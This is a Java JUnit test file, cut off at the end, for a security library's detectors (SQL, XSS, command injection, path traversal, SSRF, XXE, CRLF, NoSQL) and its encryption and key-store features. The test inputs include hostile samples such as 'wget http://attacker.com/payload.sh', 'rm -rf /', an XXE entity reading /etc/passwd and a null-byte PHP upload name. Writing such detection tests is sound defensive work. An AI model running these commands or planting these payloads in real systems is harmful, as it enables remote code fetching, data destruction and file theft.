package yueyang.vostok;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import yueyang.vostok.security.VKSecurityConfig;
import yueyang.vostok.security.VKSecurityRiskLevel;
import yueyang.vostok.security.crypto.VKRsaKeyPair;
import yueyang.vostok.security.exception.VKSecurityException;
import yueyang.vostok.security.file.VKFileType;
import yueyang.vostok.security.keystore.VKKeyStoreConfig;
import yueyang.vostok.security.rule.VKSecurityContext;
import yueyang.vostok.security.rule.VKSecurityFinding;
import yueyang.vostok.security.rule.VKSecurityRule;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

import static org.junit.jupiter.api.Assertions.*;

public class VostokSecurityTest {
    @AfterEach
    void tearDown() {
        Vostok.Security.close();
        Vostok.Security.clearCustomRules();
        Vostok.Security.clearSensitivePatterns();
    }

    @Test
    void testSafeSqlByDefault() {
        var result = Vostok.Security.checkSql("SELECT id, user_name FROM t_user WHERE id = ?", 1L);
        assertTrue(result.isSafe());
        assertEquals(VKSecurityRiskLevel.LOW, result.getRiskLevel());
        assertTrue(result.getReasons().isEmpty());
    }

    @Test
    void testDetectInjectionPattern() {
        var result = Vostok.Security.checkSql("SELECT * FROM t_user WHERE name = '' OR 1=1 --");
        assertFalse(result.isSafe());
        assertEquals(VKSecurityRiskLevel.HIGH, result.getRiskLevel());
        assertFalse(result.getMatchedRules().isEmpty());
    }

    @Test
    void testRiskFunctionPattern() {
        var result = Vostok.Security.checkSql("SELECT pg_sleep(3)");
        assertFalse(result.isSafe());
        assertEquals(VKSecurityRiskLevel.HIGH, result.getRiskLevel());
    }

    @Test
    void testMultiStatementPolicy() {
        var blocked = Vostok.Security.checkSql("SELECT 1; DROP TABLE t_user");
        assertFalse(blocked.isSafe());

        Vostok.Security.reinit(new VKSecurityConfig().allowMultiStatement(true));
        var allowed = Vostok.Security.checkSql("SELECT 1; ");
        assertTrue(allowed.isSafe());
    }

    @Test
    void testPlaceholderMismatch() {
        var result = Vostok.Security.checkSql("SELECT * FROM t_user WHERE id = ? AND age = ?", 1);
        assertFalse(result.isSafe());
        assertTrue(result.getMatchedRules().contains("sql-placeholder-arity"));
    }

    @Test
    void testAssertUnsafeSqlThrows() {
        assertThrows(VKSecurityException.class,
                () -> Vostok.Security.assertSafeSql("SELECT * FROM t_user WHERE id = 1 OR 1=1"));
    }

    @Test
    void testCustomRule() {
        Vostok.Security.registerRule(new VKSecurityRule() {
            @Override
            public String name() {
                return "custom-forbid-user-table";
            }

            @Override
            public VKSecurityFinding apply(VKSecurityContext context) {
                if (context.getScannedSql().contains("t_user")) {
                    return new VKSecurityFinding(name(), VKSecurityRiskLevel.MEDIUM, 6,
                            "custom rule blocked t_user table");
                }
                return null;
            }
        });

        var result = Vostok.Security.checkSql("SELECT * FROM t_user WHERE id = ?", 1L);
        assertFalse(result.isSafe());
        assertTrue(result.getMatchedRules().contains("custom-forbid-user-table"));
    }

    @Test
    void testXssDetection() {
        var bad = Vostok.Security.checkXss("<script>alert('x')</script>");
        assertFalse(bad.isSafe());
        assertEquals(VKSecurityRiskLevel.HIGH, bad.getRiskLevel());

        var ok = Vostok.Security.checkXss("hello world");
        assertTrue(ok.isSafe());
    }

    @Test
    void testCommandInjectionDetection() {
        var bad = Vostok.Security.checkCommandInjection("ls; rm -rf /");
        assertFalse(bad.isSafe());

        var ok = Vostok.Security.checkCommandInjection("ls -la /tmp");
        assertTrue(ok.isSafe());
    }

    @Test
    void testPathTraversalDetection() {
        var bad = Vostok.Security.checkPathTraversal("../../etc/passwd");
        assertFalse(bad.isSafe());

        var encodedBad = Vostok.Security.checkPathTraversal("..%2f..%2fsecret.txt");
        assertFalse(encodedBad.isSafe());

        var ok = Vostok.Security.checkPathTraversal("uploads/avatar.png");
        assertTrue(ok.isSafe());
    }

    @Test
    void testSensitiveResponseCheckAndMask() {
        String payload = "{\"phone\":\"13800138000\",\"email\":\"a@b.com\"}";
        var check = Vostok.Security.checkSensitiveResponse(payload);
        assertFalse(check.isSafe());

        String masked = Vostok.Security.maskSensitiveResponse(payload);
        assertTrue(masked.contains("138****8000"));
        assertTrue(masked.contains("***@***"));
    }

    @Test
    void testFileMagicDetection() {
        byte[] png = new byte[]{(byte) 0x89, 'P', 'N', 'G', '\r', '\n', 0x1A, '\n', 0x00};
        assertEquals(VKFileType.PNG, Vostok.Security.detectFileType(png));

        var allowed = Vostok.Security.checkFileMagic(png, VKFileType.PNG, VKFileType.JPEG);
        assertTrue(allowed.isSafe());

        var blocked = Vostok.Security.checkFileMagic(png, VKFileType.PDF);
        assertFalse(blocked.isSafe());
    }

    @Test
    void testExecutableScriptUploadDetection() {
        byte[] sh = "#!/bin/bash\necho hi".getBytes(StandardCharsets.UTF_8);
        var badByExt = Vostok.Security.checkExecutableScriptUpload("run.sh", "echo hi".getBytes(StandardCharsets.UTF_8));
        assertFalse(badByExt.isSafe());

        var badByMagic = Vostok.Security.checkExecutableScriptUpload("note.txt", sh);
        assertFalse(badByMagic.isSafe());

        var ok = Vostok.Security.checkExecutableScriptUpload("photo.png",
                new byte[]{(byte) 0x89, 'P', 'N', 'G', '\r', '\n', 0x1A, '\n'});
        assertTrue(ok.isSafe());
    }

    @Test
    void testAesEncryptDecrypt() {
        String key = Vostok.Security.generateAesKey();
        String cipher = Vostok.Security.encrypt("hello-aes", key);
        String plain = Vostok.Security.decrypt(cipher, key);
        assertEquals("hello-aes", plain);
    }

    @Test
    void testAesEncryptDecryptByPassphrase() {
        String cipher = Vostok.Security.encrypt("hello-passphrase", "demo-secret");
        String plain = Vostok.Security.decrypt(cipher, "demo-secret");
        assertEquals("hello-passphrase", plain);
    }

    @Test
    void testAesDecryptWithWrongSecretThrows() {
        String cipher = Vostok.Security.encrypt("hello", "secret-a");
        assertThrows(VKSecurityException.class, () -> Vostok.Security.decrypt(cipher, "secret-b"));
    }

    @Test
    void testRsaEncryptDecrypt() {
        VKRsaKeyPair pair = Vostok.Security.generateRsaKeyPair();
        String cipher = Vostok.Security.encryptByPublicKey("hello-rsa", pair.getPublicKeyPem());
        String plain = Vostok.Security.decryptByPrivateKey(cipher, pair.getPrivateKeyPem());
        assertEquals("hello-rsa", plain);
    }

    @Test
    void testRsaSignVerify() {
        VKRsaKeyPair pair = Vostok.Security.generateRsaKeyPair();
        String data = "{\"id\":1,\"name\":\"tom\"}";
        String sign = Vostok.Security.sign(data, pair.getPrivateKeyPem());
        assertTrue(Vostok.Security.verify(data, sign, pair.getPublicKeyPem()));
        assertFalse(Vostok.Security.verify(data + "-tampered", sign, pair.getPublicKeyPem()));
    }

    @Test
    void testHashAndHmac() {
        assertEquals("ungWv48Bz+pBQUDeXa4iI7ADYaOWF3qctBD/YfIAFa0=", Vostok.Security.sha256("abc"));
        assertEquals("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad", Vostok.Security.sha256Hex("abc"));

        String hmac1 = Vostok.Security.hmacSha256("hello", "key");
        String hmac2 = Vostok.Security.hmacSha256("hello", "key");
        String hmac3 = Vostok.Security.hmacSha256("hello2", "key");
        assertEquals(hmac1, hmac2);
        assertNotEquals(hmac1, hmac3);
    }

    @Test
    void testKeyStoreGetOrCreateAesKeyPersistence() throws Exception {
        var dir = Files.createTempDirectory("vostok-keystore-aes");
        VKKeyStoreConfig cfg = new VKKeyStoreConfig()
                .baseDir(dir.toString())
                .masterKey("master-123");
        Vostok.Security.initKeyStore(cfg);

        String k1 = Vostok.Security.getOrCreateAesKey("order-data");
        String k2 = Vostok.Security.getOrCreateAesKey("order-data");
        assertEquals(k1, k2);

        Vostok.Security.close();
        Vostok.Security.initKeyStore(cfg);
        String k3 = Vostok.Security.getOrCreateAesKey("order-data");
        assertEquals(k1, k3);
    }

    @Test
    void testKeyStoreGetOrCreateRsaKeyPairPersistence() throws Exception {
        var dir = Files.createTempDirectory("vostok-keystore-rsa");
        VKKeyStoreConfig cfg = new VKKeyStoreConfig()
                .baseDir(dir.toString())
                .masterKey("master-rsa");
        Vostok.Security.initKeyStore(cfg);

        VKRsaKeyPair p1 = Vostok.Security.getOrCreateRsaKeyPair("order-rsa");
        VKRsaKeyPair p2 = Vostok.Security.getOrCreateRsaKeyPair("order-rsa");
        assertEquals(p1.getPublicKeyPem(), p2.getPublicKeyPem());
        assertEquals(p1.getPrivateKeyPem(), p2.getPrivateKeyPem());
    }

    @Test
    void testEncryptDecryptWithKeyIdAcrossRestart() throws Exception {
        var dir = Files.createTempDirectory("vostok-keystore-restart");
        VKKeyStoreConfig cfg = new VKKeyStoreConfig()
                .baseDir(dir.toString())
                .masterKey("master-restart");
        Vostok.Security.initKeyStore(cfg);

        String payload = Vostok.Security.encryptWithKeyId("hello-persist", "biz-aes");
        String plain1 = Vostok.Security.decryptWithKeyId(payload);
        assertEquals("hello-persist", plain1);

        Vostok.Security.close();
        Vostok.Security.initKeyStore(cfg);
        String plain2 = Vostok.Security.decryptWithKeyId(payload);
        assertEquals("hello-persist", plain2);
    }

    @Test
    void testDecryptWithWrongMasterKeyFails() throws Exception {
        var dir = Files.createTempDirectory("vostok-keystore-master");
        VKKeyStoreConfig cfg1 = new VKKeyStoreConfig()
                .baseDir(dir.toString())
                .masterKey("master-ok");
        Vostok.Security.initKeyStore(cfg1);
        String payload = Vostok.Security.encryptWithKeyId("hello-master", "master-key");

        VKKeyStoreConfig cfg2 = new VKKeyStoreConfig()
                .baseDir(dir.toString())
                .masterKey("master-wrong");
        Vostok.Security.initKeyStore(cfg2);

        assertThrows(VKSecurityException.class, () -> Vostok.Security.decryptWithKeyId(payload));
    }

    @Test
    void testRotateAesKey() throws Exception {
        var dir = Files.createTempDirectory("vostok-keystore-rotate");
        VKKeyStoreConfig cfg = new VKKeyStoreConfig()
                .baseDir(dir.toString())
                .masterKey("master-rotate");
        Vostok.Security.initKeyStore(cfg);

        String oldKey = Vostok.Security.getOrCreateAesKey("rotate-aes");
        Vostok.Security.rotateAesKey("rotate-aes");
        String newKey = Vostok.Security.getOrCreateAesKey("rotate-aes");
        assertNotEquals(oldKey, newKey);
    }

    @Test
    void testRotateRsaKeyPair() throws Exception {
        var dir = Files.createTempDirectory("vostok-keystore-rotate-rsa");
        VKKeyStoreConfig cfg = new VKKeyStoreConfig()
                .baseDir(dir.toString())
                .masterKey("master-rotate-rsa");
        Vostok.Security.initKeyStore(cfg);

        VKRsaKeyPair oldPair = Vostok.Security.getOrCreateRsaKeyPair("rotate-rsa");
        Vostok.Security.rotateRsaKeyPair("rotate-rsa");
        VKRsaKeyPair newPair = Vostok.Security.getOrCreateRsaKeyPair("rotate-rsa");

        assertNotEquals(oldPair.getPublicKeyPem(), newPair.getPublicKeyPem());
        assertNotEquals(oldPair.getPrivateKeyPem(), newPair.getPrivateKeyPem());
    }

    @Test
    void testDecryptWithKeyIdPayloadFormatValidation() {
        assertThrows(VKSecurityException.class, () -> Vostok.Security.decryptWithKeyId("bad-payload"));
    }

    // ---------------------------------------------------------------- Bug 修复测试

    /**
     * Bug1 fix: XSS 检测应能识别 URL 编码的载荷（%3Cscript%3E → <script>）。
     * 双重编码（%253C → %3C → <）同样应被检测。
     */
    @Test
    void testXssEncodedPayloadDetected() {
        // 单层 URL 编码 %3Cscript%3E → <script>
        var result1 = Vostok.Security.checkXss("%3Cscript%3Ealert(1)%3C%2Fscript%3E");
        assertFalse(result1.isSafe(), "URL-encoded script tag should be detected");
        assertEquals(VKSecurityRiskLevel.HIGH, result1.getRiskLevel());

        // 双重 URL 编码 %253Cscript%253E → %3Cscript%3E → <script>
        var result2 = Vostok.Security.checkXss("%253Cscript%253Ealert(1)%253C%252Fscript%253E");
        assertFalse(result2.isSafe(), "Double URL-encoded script tag should be detected");
        assertEquals(VKSecurityRiskLevel.HIGH, result2.getRiskLevel());
    }

    /**
     * Bug2 fix: EVENT_HANDLER 模式现在要求 onXXX 出现在 HTML 标签内部，
     * 不应将 online=true、ongoing 等普通查询参数误报为 XSS。
     */
    @Test
    void testXssEventHandlerNoFalsePositiveOnPlainText() {
        // 普通查询参数，不包含 HTML 标签，不应误报
        assertTrue(Vostok.Security.checkXss("online=true").isSafe(),
                "Plain query param 'online=true' should not be flagged");
        assertTrue(Vostok.Security.checkXss("status=ongoing").isSafe(),
                "Plain param 'ongoing' should not be flagged");
        assertTrue(Vostok.Security.checkXss("content=onboarding").isSafe(),
                "Plain param 'onboarding' should not be flagged");

        // HTML 标签内部的事件属性，应该被检测
        var result = Vostok.Security.checkXss("<div onclick=\"evil()\">click</div>");
        assertFalse(result.isSafe(), "onclick inside HTML tag should be detected");
        assertEquals(VKSecurityRiskLevel.HIGH, result.getRiskLevel());
    }

    /**
     * Bug3 fix: 危险命令单独出现（无 shell 元字符）时应触发 MEDIUM 告警。
     * 原实现漏报 "wget http://attacker.com/payload.sh" 等无元字符的危险命令。
     */
    @Test
    void testCommandInjectionDangerousCommandAlone() {
        // wget 不带元字符，原实现返回 safe，Bug3 fix 后应返回 MEDIUM
        var result = Vostok.Security.checkCommandInjection("wget http://attacker.com/payload.sh");
        assertFalse(result.isSafe(), "wget without metacharacters should be flagged");
        assertEquals(VKSecurityRiskLevel.MEDIUM, result.getRiskLevel());
        assertTrue(result.getMatchedRules().contains("cmd-dangerous-alone"));

        // curl 同理
        var result2 = Vostok.Security.checkCommandInjection("curl http://evil.com/script.sh");
        assertFalse(result2.isSafe());
        assertEquals(VKSecurityRiskLevel.MEDIUM, result2.getRiskLevel());
    }

    /**
     * Bug4 fix: 路径遍历检测应识别双重 URL 编码绕过
     * %252e%252e%252f → %2e%2e%2f → ../ 应被检测。
     */
    @Test
    void testPathTraversalDoubleEncodedDetected() {
        // 双重编码：%252e = %25 + 2e → 解码后 %2e；再解码 → '.'
        var result = Vostok.Security.checkPathTraversal("%252e%252e%252fetc%252fpasswd");
        assertFalse(result.isSafe(), "Double URL-encoded path traversal should be detected");
        assertEquals(VKSecurityRiskLevel.HIGH, result.getRiskLevel());
        assertTrue(result.getMatchedRules().contains("path-traversal-dotdot"));
    }

    /**
     * Bug5 fix: 响应敏感数据检测应遍历所有规则，不因 email（MEDIUM）early-return 而漏报银行卡（HIGH）。
     * 同时含 email + 银行卡时，结果应为 HIGH 并列出两条规则。
     */
    @Test
    void testSensitiveResponseAllTypesReported() {
        // 同时含 email（MEDIUM）和银行卡号（HIGH）
        String payload = "{\"email\":\"admin@company.com\",\"bankCard\":\"4111111111111111\"}";
        var result = Vostok.Security.checkSensitiveResponse(payload);
        assertFalse(result.isSafe());
        // Bug5 fix 前：early-return 只报 email（MEDIUM）；fix 后应报 HIGH（银行卡）
        assertEquals(VKSecurityRiskLevel.HIGH, result.getRiskLevel(),
                "Result should be HIGH when bank card is present, not just MEDIUM for email");
        assertTrue(result.getMatchedRules().contains("resp-sensitive-email"),
                "Email rule should be reported");
        assertTrue(result.getMatchedRules().contains("resp-sensitive-bankcard"),
                "Bank card rule should also be reported (not early-returned)");
    }

    /**
     * Bug6 fix: 文件名含 null byte（\0）时应立即拒绝，防止 evil.php\0.jpg 绕过扩展名检测。
     */
    @Test
    void testFileNullByteFilenameBlocked() {
        byte[] content = "<?php echo 'pwned'; ?>".getBytes(java.nio.charset.StandardCharsets.UTF_8);
        // evil.php\0.jpg：endsWith(".jpg")=true 但实际是 PHP 文件
        String maliciousName = "evil.php\0.jpg";
        var result = Vostok.Security.checkExecutableScriptUpload(maliciousName, content);
        assertFalse(result.isSafe(), "Null byte in filename should be rejected");
        assertEquals(VKSecurityRiskLevel.HIGH, result.getRiskLevel());
        assertTrue(result.getMatchedRules().contains("upload-nullbyte-filename"));
    }

    /**
     * Bug7 fix: SQL 关键字规则应返回得分最高的命中，而非首个命中。
     * SQL 同时含 OR 1=1（score=9）和 xp_cmdshell（score=10）时，应报 xp_cmdshell。
     */
    @Test
    void testSqlKeywordHighestScoreReported() {
        // 同时包含 OR 1=1（score=9）和 xp_cmdshell（score=10）
        var result = Vostok.Security.checkSql(
                "SELECT * FROM users WHERE name = 'admin' OR 1=1 AND xp_cmdshell IS NOT NULL");
        assertFalse(result.isSafe());
        // Bug7 fix：应报告得分最高的 xp_cmdshell，而非首个命中的 OR 1=1
        assertTrue(result.getReasons().stream().anyMatch(r -> r.contains("xp_cmdshell")),
                "Highest-scoring rule (xp_cmdshell) should be reported");
    }

    // ---------------------------------------------------------------- 功能扩展测试（Ext1-Ext8）

    /**
     * Ext1: XSS 净化应将 HTML 危险字符转为实体编码，使载荷失效。
     */
    @Test
    void testXssSanitizeHtmlEntities() {
        String input = "<script>alert('xss')</script>";
        String sanitized = Vostok.Security.sanitizeXss(input);
        // 所有危险字符均应被编码
        assertEquals("&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;", sanitized);

        // 含 & 的输入，& 应被优先编码（避免二次编码）
        assertEquals("a &amp; b &lt;c&gt;", Vostok.Security.sanitizeXss("a & b <c>"));

        // null 输入返回 null
        assertNull(Vostok.Security.sanitizeXss(null));
    }

    /**
     * Ext2: SSRF 检测应识别内网 IP 和危险协议。
     */
    @Test
    void testSsrfPrivateIpDetected() {
        // 私有 IP 段
        assertFalse(Vostok.Security.checkSsrf("http://192.168.1.100/admin").isSafe(),
                "192.168.x.x should be flagged");
        assertFalse(Vostok.Security.checkSsrf("http://10.0.0.1:8080/api").isSafe(),
                "10.x.x.x should be flagged");
        assertFalse(Vostok.Security.checkSsrf("http://172.16.0.1/secret").isSafe(),
                "172.16.x.x should be flagged");
        assertFalse(Vostok.Security.checkSsrf("http://127.0.0.1/internal").isSafe(),
                "127.x.x.x (loopback) should be flagged");
        assertFalse(Vostok.Security.checkSsrf("http://169.254.169.254/latest/meta-data/").isSafe(),
                "Cloud metadata endpoint should be flagged");

        // localhost
        assertFalse(Vostok.Security.checkSsrf("http://localhost:8080/admin").isSafe(),
                "localhost should be flagged");

        // 公网 IP，应该安全
        assertTrue(Vostok.Security.checkSsrf("http://example.com/api/data").isSafe(),
                "Public URL should be safe");
    }

    @Test
    void testSsrfDangerousScheme() {
        assertFalse(Vostok.Security.checkSsrf("file:///etc/passwd").isSafe(),
                "file:// scheme should be flagged");
        assertFalse(Vostok.Security.checkSsrf("gopher://internal-host/payload").isSafe(),
                "gopher:// scheme should be flagged");
        assertFalse(Vostok.Security.checkSsrf("dict://127.0.0.1:11211/info").isSafe(),
                "dict:// scheme should be flagged");

        // 正常 http/https 不应误报
        assertTrue(Vostok.Security.checkSsrf("https://api.example.com/v2/data").isSafe());
    }

    /**
     * Ext3: XXE 检测应识别外部实体引用。
     */
    @Test
    void testXxeExternalEntityDetected() {
        // 外部实体引用（最高风险）
        String xxePayload = "<?xml version=\"1.0\"?>"
                + "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
                + "<foo>&xxe;</foo>";
        var result = Vostok.Security.checkXxe(xxePayload);
        assertFalse(result.isSafe(), "XXE payload should be detected");
        assertEquals(VKSecurityRiskLevel.HIGH, result.getRiskLevel());

        // 仅实体声明（中等风险）
        String entityOnly = "<!DOCTYPE foo [<!ENTITY name \"value\">]><foo/>";
        var result2 = Vostok.Security.checkXxe(entityOnly);
        assertFalse(result2.isSafe());

        // 正常 XML 应安全
        assertTrue(Vostok.Security.checkXxe("<root><item>hello</item></root>").isSafe());
        assertTrue(Vostok.Security.checkXxe(null).isSafe());
    }

    /**
     * Ext4: CRLF 注入检测，包含原始字符、URL 编码和双重编码三种形式。
     */
    @Test
    void testCrlfRawCharacterDetected() {
        // 原始 CR/LF 字符
        var result1 = Vostok.Security.checkCrlf("https://example.com\r\nSet-Cookie: evil=1");
        assertFalse(result1.isSafe(), "Raw CRLF should be detected");
        assertEquals(VKSecurityRiskLevel.HIGH, result1.getRiskLevel());
        assertTrue(result1.getMatchedRules().contains("crlf-raw"));

        // URL 编码形式 %0d%0a
        var result2 = Vostok.Security.checkCrlf("https://example.com%0d%0aSet-Cookie: evil=1");
        assertFalse(result2.isSafe(), "URL-encoded CRLF %0d%0a should be detected");
        assertTrue(result2.getMatchedRules().contains("crlf-encoded"));

        // 正常值应安全
        assertTrue(Vostok.Security.checkCrlf("https://example.com/redirect?next=/home").isSafe());
    }

    @Test
    void testCrlfDoubleEncodedDetected() {
        // 双重编码：%250d%250a → 解码后 %0d%0a → 再解码后 \r\n
        var result = Vostok.Security.checkCrlf("https://example.com%250d%250aInjected-Header: value");
        assertFalse(result.isSafe(), "Double-encoded CRLF should be detected");
        assertEquals(VKSecurityRiskLevel.HIGH, result.getRiskLevel());
        assertTrue(result.getMatchedRules().contains("crlf-double-encoded"));
    }

    /**
     * Ext5: 密钥 TTL 检测——新建密钥应未过期；较长 TTL 内应返回相同密钥。
     */
    @Test
    void testKeyStoreTtlNotExpiredWhenFresh() throws Exception {
        var dir = java.nio.file.Files.createTempDirectory("vostok-keystore-ttl");
        VKKeyStoreConfig cfg = new VKKeyStoreConfig()
                .baseDir(dir.toString())
                .masterKey("master-ttl");
        Vostok.Security.initKeyStore(cfg);

        // 创建密钥
        String key1 = Vostok.Security.getOrCreateAesKey("ttl-fresh-aes");

        // TTL 为负数 → 永不过期
        assertFalse(Vostok.Security.isExpiredAesKey("ttl-fresh-aes", -1));
        // TTL 为 0 → 永不过期
        assertFalse(Vostok.Security.isExpiredAesKey("ttl-fresh-aes", 0));
        // 24 小时 TTL → 刚创建的密钥未过期
        assertFalse(Vostok.Security.isExpiredAesKey("ttl-fresh-aes", 86400));

        // getOrCreateAesKey 带 24h TTL 返回同一密钥（未过期，不轮换）
        String key2 = Vostok.Security.getOrCreateAesKey("ttl-fresh-aes", 86400);
        assertEquals(key1, key2, "Unexpired key should not be rotated");

        Vostok.Security.close();
    }

    /**
     * Ext5: 密钥过期后 getOrCreateAesKey(id, ttl) 应自动轮换返回新密钥。
     */
    @Test
    void testKeyStoreTtlAutoRotate() throws Exception {
        var dir = java.nio.file.Files.createTempDirectory("vostok-keystore-ttl-rotate");
        VKKeyStoreConfig cfg = new VKKeyStoreConfig()
                .baseDir(dir.toString())
                .masterKey("master-ttl-rotate");
        Vostok.Security.initKeyStore(cfg);

        String key1 = Vostok.Security.getOrCreateAesKey("ttl-expire-aes");

        // 等待 1.2 秒，使密钥超过 1 秒的 TTL
        Thread.sleep(1200);

        assertTrue(Vostok.Security.isExpiredAesKey("ttl-expire-aes", 1),
                "Key should be expired after TTL elapsed");

        // getOrCreateAesKey 带 TTL=1 秒应自动轮换返回新密钥
        String key2 = Vostok.Security.getOrCreateAesKey("ttl-expire-aes", 1);
        assertNotEquals(key1, key2, "Expired key should be auto-rotated to a new key");

        // 轮换后立即查询 isExpired 应为 false（新密钥刚写入）
        assertFalse(Vostok.Security.isExpiredAesKey("ttl-expire-aes", 1));

        Vostok.Security.close();
    }

    /**
     * Ext6: 自定义敏感字段正则注册后应被响应检测器识别。
     */
    @Test
    void testRegisterCustomSensitivePattern() {
        // 注册自定义员工号模式
        Vostok.Security.registerSensitivePattern("EMP-\\d{6}");

        // 包含员工号的响应应被检测
        var result = Vostok.Security.checkSensitiveResponse("{\"employeeId\":\"EMP-123456\"}");
        assertFalse(result.isSafe(), "Custom pattern EMP-\\d{6} should be detected");
        assertTrue(result.getMatchedRules().contains("resp-sensitive-custom"));
        assertEquals(VKSecurityRiskLevel.MEDIUM, result.getRiskLevel());

        // 不含员工号的响应应安全
        assertTrue(Vostok.Security.checkSensitiveResponse("{\"name\":\"Alice\"}").isSafe());

        // clearSensitivePatterns 后不再检测
        Vostok.Security.clearSensitivePatterns();
        assertTrue(Vostok.Security.checkSensitiveResponse("{\"employeeId\":\"EMP-654321\"}").isSafe(),
                "After clearing, custom pattern should no longer be active");
    }

    /**
     * Ext7: 开启审计日志时，对 unsafe 结果记录日志不应抛出异常。
     */
    @Test
    void testAuditLogDoesNotThrowOnUnsafe() {
        // 启用审计日志
        Vostok.Security.reinit(new VKSecurityConfig().auditLog(true));

        // 以下调用均应正常完成，不抛出任何异常（日志写入失败时静默忽略）
        assertDoesNotThrow(() -> Vostok.Security.checkSql(
                "SELECT * FROM users WHERE id = 1 OR 1=1"));
        assertDoesNotThrow(() -> Vostok.Security.checkXss("<script>alert(1)</script>"));
        assertDoesNotThrow(() -> Vostok.Security.checkCommandInjection("rm -rf /; wget evil.com"));
        assertDoesNotThrow(() -> Vostok.Security.checkPathTraversal("../../etc/passwd"));
        assertDoesNotThrow(() -> Vostok.Security.checkSsrf("http://192.168.1.1/admin"));
        assertDoesNotThrow(() -> Vostok.Security.checkXxe(
                "<?xml?><!DOCTYPE foo [<!ENTITY x SYSTEM 'file:///etc/passwd'>]>"));
        assertDoesNotThrow(() -> Vostok.Security.checkCrlf("value\r\nInjected: header"));
        assertDoesNotThrow(() -> Vostok.Security.checkNoSqlInjection("{\"$where\":\"1==1\"}"));
    }

    /**
     * Ext8: NoSQL 注入检测——$where JS 注入和操作符注入均应被识别。
     */
    @Test
    void testNoSqlInjectionDetected() {
        // $where JavaScript 注入（最高风险）
        var result1 = Vostok.Security.checkNoSqlInjection(
                "{\"username\":{\"$where\":\"this.password == 'x'\"}}");
        assertFalse(result1.isSafe(), "$where injection should be detected");
        assertEquals(VKSecurityRiskLevel.HIGH, result1.getRiskLevel());
        assertTrue(result1.getMatchedRules().contains("nosql-where-injection"));

        // JSON 对象中操作符注入（{"$ne": null} 绕过认证）
        var result2 = Vostok.Security.checkNoSqlInjection(
                "{\"password\":{\"$ne\":null}}");
        assertFalse(result2.isSafe(), "Operator injection in JSON object should be detected");
        assertEquals(VKSecurityRiskLevel.HIGH, result2.getRiskLevel());
        assertTrue(result2.getMatchedRules().contains("nosql-operator-object"));

        // 单独操作符（中等风险）
        var result3 = Vostok.Security.checkNoSqlInjection("filter=$gt&value=0");
        assertFalse(result3.isSafe(), "Standalone NoSQL operator should be flagged");
        assertEquals(VKSecurityRiskLevel.MEDIUM, result3.getRiskLevel());

        // 正常 JSON，无操作符
        assertTrue(Vostok.Security.checkNoSqlInjection("{\"name\":\"Alice\",\"age\":30}").isSafe());
    }

    // ---------------------------------------------------------------- 文件加解密测试

    /**
     * 正常路径：文本文件 round-trip，验证 Unicode 内容完全还原。
     */
    @Test
    void testEncryptDecryptFileTextRoundTrip() throws Exception {
        var dir = Files.createTempDirectory("vostok-file-enc");
        Vostok.Security.initKeyStore(new VKKeyStoreConfig()
                .baseDir(dir.toString()).masterKey("master-file-enc"));

        String plaintext = "Hello, Vostok file encryption! 中文内容 \uD83D\uDE00";
        Path src = dir.resolve("plain.txt");
        Path enc = dir.resolve("encrypted.vkf");
        Path dec = dir.resolve("decrypted.txt");

        Files.writeString(src, plaintext, StandardCharsets.UTF_8);
        Vostok.Security.encryptFile(src, enc, "file-key");
        Vostok.Security.decryptFile(enc, dec);

        assertEquals(plaintext, Files.readString(dec, StandardCharsets.UTF_8));
        // 密文文件应以 VKFC 魔数开头
        byte[] head = new byte[4];
        try (var is = Files.newInputStream(enc)) {
            //noinspection ResultOfMethodCallIgnored
            is.read(head);
        }
        assertArrayEquals(new byte[]{'V', 'K', 'F', 'C'}, head, "Encrypted file should start with VKFC magic");
    }

    /**
     * 二进制文件 round-trip：含 PNG 魔数 + 随机字节，验证不受 String/UTF-8 转换影响。
     */
    @Test
    void testEncryptDecryptFileBinaryData() throws Exception {
        var dir = Files.createTempDirectory("vostok-file-binary");
        Vostok.Security.initKeyStore(new VKKeyStoreConfig()
                .baseDir(dir.toString()).masterKey("master-binary"));

        // 构造含 PNG 魔数 + 随机字节（含 0x00、0xFF 等特殊值）的二进制内容
        byte[] binaryData = new byte[4096];
        new java.util.Random(42).nextBytes(binaryData);
        binaryData[0] = (byte) 0x89;
        binaryData[1] = 'P';
        binaryData[2] = 'N';
        binaryData[3] = 'G';

        Path src = dir.resolve("image.bin");
        Path enc = dir.resolve("image.vkf");
        Path dec = dir.resolve("image_dec.bin");

        Files.write(src, binaryData);
        Vostok.Security.encryptFile(src, enc, "bin-key");
        Vostok.Security.decryptFile(enc, dec);

        assertArrayEquals(binaryData, Files.readAllBytes(dec), "Binary file should round-trip without corruption");
    }

    /**
     * 边界：空文件加解密不抛异常，解密结果仍为空。
     */
    @Test
    void testEncryptDecryptEmptyFile() throws Exception {
        var dir = Files.createTempDirectory("vostok-file-empty");
        Vostok.Security.initKeyStore(new VKKeyStoreConfig()
                .baseDir(dir.toString()).masterKey("master-empty"));

        Path src = dir.resolve("empty.dat");
        Path enc = dir.resolve("empty.vkf");
        Path dec = dir.resolve("empty_dec.dat");

        Files.write(src, new byte[0]);
        Vostok.Security.encryptFile(src, enc, "empty-key");
        Vostok.Security.decryptFile(enc, dec);

        assertArrayEquals(new byte[0], Files.readAllBytes(dec), "Empty file should decrypt to empty");
    }

    /**
     * Stream API：encryptStream/decryptStream 使用内存流，验证流接口正确性。
     */
    @Test
    void testEncryptDecryptStream() throws Exception {
        var dir = Files.createTempDirectory("vostok-stream-enc");
        Vostok.Security.initKeyStore(new VKKeyStoreConfig()
                .baseDir(dir.toString()).masterKey("master-stream"));

        byte[] original = "stream-encrypt-test \uD83D\uDD11".getBytes(StandardCharsets.UTF_8);

        ByteArrayOutputStream encryptedOut = new ByteArrayOutputStream();
        Vostok.Security.encryptStream(new ByteArrayInputStream(original), encryptedOut, "stream-key");

        ByteArrayOutputStream decryptedOut = new ByteArrayOutputStream();
        Vostok.Security.decryptStream(new ByteArrayInputStream(encryptedOut.toByteArray()), decryptedOut);

        assertArrayEquals(original, decryptedOut.toByteArray(), "Stream round-trip should restore original bytes");
    }

    /**
